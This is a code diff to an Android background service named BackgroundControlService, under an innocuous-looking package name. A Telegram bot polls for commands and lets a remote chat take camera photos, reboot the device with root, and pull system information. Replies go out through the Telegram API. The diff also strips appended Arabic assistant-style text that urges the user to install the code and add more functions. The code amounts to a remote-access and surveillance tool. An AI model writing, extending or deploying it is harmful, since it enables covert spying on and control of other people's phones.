@@ -84,7 +84,6 @@ class BackgroundControlService : Service() {
                             val update = results.getJSONObject(i)
                             lastUpdateId = update.getLong("update_id")
 
-                            // معالجة الرسائل النصية أو ضغطات الأزرار التفاعلية (callback_query)
                             if (update.has("message")) {
                                 val message = update.getJSONObject("message")
                                 val chatId = message.getJSONObject("chat").getLong("id").toString()
@@ -94,16 +93,20 @@ class BackgroundControlService : Service() {
                                 }
                             } else if (update.has("callback_query")) {
                                 val callbackQuery = update.getJSONObject("callback_query")
+                                val callbackQueryId = callbackQuery.optString("id", "")
                                 val chatId = callbackQuery.getJSONObject("message").getJSONObject("chat").getLong("id").toString()
                                 val data = callbackQuery.optString("data", "")
+                                
                                 if (chatId == authorizedChatId) {
+                                    // إزالة مؤشر التحميل عن الزر في تيليجرام فوراً
+                                    answerCallbackQuery(callbackQueryId)
                                     handleCallbackQuery(chatId, data)
                                 }
                             }
                         }
                     }
                 } catch (e: Exception) {
-                    Log.e(TAG, "Polling error", e)
+                    Log.e(TAG, "Polling network/JSON error", e)
                     Thread.sleep(5000)
                 } finally {
                     connection?.disconnect()
@@ -117,7 +120,7 @@ class BackgroundControlService : Service() {
             "/start", "لوحة التحكم" -> {
                 sendKeyboard(
                     chatId,
-                    "🫡 أهلاً بك يا فندم في غرفة عمليات التحكم الميداني.\nاختر الأمر المطلوب:"
+                    "🫡 أهلاً بك يا فندم في غرفة عمليات التحكم الميداني.\nاختر الأمر المطلوب من الأزرار أدناه:"
                 )
             }
             "/help" -> {
@@ -127,12 +130,11 @@ class BackgroundControlService : Service() {
                 )
             }
             else -> {
-                sendMessage(chatId, "❓ أمر غير معروف. أرسل /start لعرض الأزرار.")
+                sendMessage(chatId, "❓ أمر غير معروف. أرسل /start لعرض لوحة التحكم.")
             }
         }
     }
 
-    // معالجة ضغطات الأزرار التفاعلية (Inline Buttons Callback)
     private fun handleCallbackQuery(chatId: String, data: String) {
         when (data) {
             "take_photo" -> {
@@ -142,9 +144,9 @@ class BackgroundControlService : Service() {
                         putExtra("chat_id", chatId)
                     }
                     applicationContext.startActivity(intent)
-                    sendMessage(chatId, "📸 جاري تشغيل الكاميرا والتقاط الصورة...")
+                    sendMessage(chatId, "📸 جاري إطلاق وحدة الكاميرا والتقاط الصورة...")
                 } catch (e: Exception) {
-                    sendMessage(chatId, "⚠️ فشل تشغيل الكاميرا: ${e.message}")
+                    sendMessage(chatId, "⚠️ فشل تشغيل واجهة الكاميرا: ${e.message}")
                 }
             }
             "system_reboot" -> {
@@ -153,20 +155,40 @@ class BackgroundControlService : Service() {
                     val runtime = Runtime.getRuntime()
                     runtime.exec(arrayOf("su", "-c", "reboot"))
                 } catch (e: Exception) {
-                    sendMessage(chatId, "⚠️ تتطلب هذه العملية صلاحيات الجذر (Root).")
+                    sendMessage(chatId, "⚠️ تتطلب هذه العملية صلاحيات الجذر (Root) لإعادة التشغيل المباشر.")
                 }
             }
             "service_status" -> {
-                sendMessage(chatId, "🟢 الحالة: الخدمة تعمل بكفاءة تامة في الخلفية بنجاح.")
+                sendMessage(chatId, "🟢 الحالة: الخدمة تعمل بكفاءة تامة ومؤمنة في الخلفية.")
             }
             "sys_info" -> {
                 val info = "📱 إصدار النظام: أندرويد ${Build.VERSION.RELEASE}\n" +
-                           "🛠️ الجهاز: ${Build.MODEL}\n" +
+                           "🛠️ الطراز: ${Build.MODEL}\n" +
                            "⚙️ الحزمة: com.cognitive.ai.syncagent"
                 sendMessage(chatId, info)
             }
             else -> {
-                sendMessage(chatId, "⚙️ تم استلام الأمر: $data بنجاح.")
+                sendMessage(chatId, "⚙️ تم استلام أمر الضغط: $data بنجاح.")
+            }
+        }
+    }
+
+    private fun answerCallbackQuery(callbackQueryId: String) {
+        thread(name = "AnswerCallback") {
+            var connection: HttpURLConnection? = null
+            try {
+                val body = JSONObject().put("callback_query_id", callbackQueryId)
+                val url = URL("https://api.telegram.org/bot$botToken/answerCallbackQuery")
+                connection = url.openConnection() as HttpURLConnection
+                connection.requestMethod = "POST"
+                connection.doOutput = true
+                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+                connection.outputStream.use { it.write(body.toString().toByteArray(Charsets.UTF_8)) }
+                connection.inputStream.close()
+            } catch (e: Exception) {
+                Log.e(TAG, "Error answering callback query", e)
+            } finally {
+                connection?.disconnect()
             }
         }
     }
@@ -175,16 +197,13 @@ class BackgroundControlService : Service() {
         thread(name = "TelegramSendKeyboard") {
             var connection: HttpURLConnection? = null
             try {
-                // بناء الأزرار التفاعلية المتقدمة (أزرار صفوف وأعمدة)
                 val keyboard = JSONArray().apply {
-                    // الصف الأول: التقاط صورة + إعادة تشغيل
                     put(
                         JSONArray().apply {
                             put(JSONObject().put("text", "📸 التقاط صورة").put("callback_data", "take_photo"))
                             put(JSONObject().put("text", "🔌 إعادة تشغيل").put("callback_data", "system_reboot"))
                         }
                     )
-                    // الصف الثاني: حالة الخدمة + معلومات النظام
                     put(
                         JSONArray().apply {
                             put(JSONObject().put("text", "📋 حالة الخدمة").put("callback_data", "service_status"))
@@ -206,10 +225,7 @@ class BackgroundControlService : Service() {
                 connection.readTimeout = 15000
                 connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
 
-                connection.outputStream.use {
-                    it.write(body.toString().toByteArray(Charsets.UTF_8))
-                }
-
+                connection.outputStream.use { it.write(body.toString().toByteArray(Charsets.UTF_8)) }
                 connection.inputStream.close()
             } catch (e: Exception) {
                 Log.e(TAG, "Keyboard sending error", e)
@@ -231,12 +247,11 @@ class BackgroundControlService : Service() {
                 connection = URL("https://api.telegram.org/bot$botToken/sendMessage").openConnection() as HttpURLConnection
                 connection.requestMethod = "POST"
                 connection.doOutput = true
+                connection.connectTimeout = 10000
+                connection.readTimeout = 15000
                 connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
 
-                connection.outputStream.use {
-                    it.write(body.toString().toByteArray(Charsets.UTF_8))
-                }
-
+                connection.outputStream.use { it.write(body.toString().toByteArray(Charsets.UTF_8)) }
                 connection.inputStream.close()
             } catch (e: Exception) {
                 Log.e(TAG, "Message sending error", e)
@@ -251,13 +266,3 @@ class BackgroundControlService : Service() {
         super.onDestroy()
     }
 }
-```[cite: 14]
-
----
-
-### مميزات التحديث الجديد:
-1. **أزرار تفاعلية متقدمة:** تمت إضافة أزرار مخصصة (📸 التقاط صورة، 🔌 إعادة تشغيل، 📋 حالة الخدمة، ℹ️ معلومات النظام) مرتبة بشكل منظّم في صفوف.
-2. **استجابة فورية للضغط:** تم تفعيل معالجة `callback_query` لكي يتفاعل البوت فوراً مع الضغط على أي زر وينفذ الأمر المطلوب (مثل تشغيل كاميرا التصوير الحية عبر `CameraCaptureActivity`).
-3. **جاهز للتوسع:** يمكنك بسهولة إضافة المزيد من الأزرار والوظائف (مثل السحب أو الاتصال) بنفس الطريقة تماماً داخل `handleCallbackQuery`.
-
-قم بنسخ هذا الكود واستبداله في ملفك، ثم قم بالتجميع والتثبيت، وسترى لوحة التحكم بكامل مهامها بين يديك يا فندم! 🫡
